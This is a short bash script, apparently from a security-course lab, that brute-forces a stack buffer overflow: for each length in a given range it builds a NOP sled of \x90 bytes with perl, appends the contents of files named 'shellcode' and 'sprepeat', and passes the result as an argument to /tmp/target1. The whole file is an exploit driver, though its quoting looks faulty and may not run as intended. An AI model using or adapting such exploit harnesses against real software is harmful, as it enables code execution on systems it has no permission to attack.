#!/bin/bash
echo testing from $1 to $2...;
for (( i=$1; i<=$2; i++ ))
do
  echo $i;   
  echo $"(perl -e 'print \"\x90\"x$i'; cat shellcode sprepeat)";
  #echo $($"(perl -e 'print \"\x90\"x$i'; cat shellcode sprepeat)");
  #$"perl -e 'print \"\x90\"x$i'; cat shellcode sprepeat" > fullcommand
  #wc fullcommand
  #rm fullcommand
  /tmp/target1 $"(perl -e 'print \"\x90\"x$i'; cat shellcode sprepeat)";
done
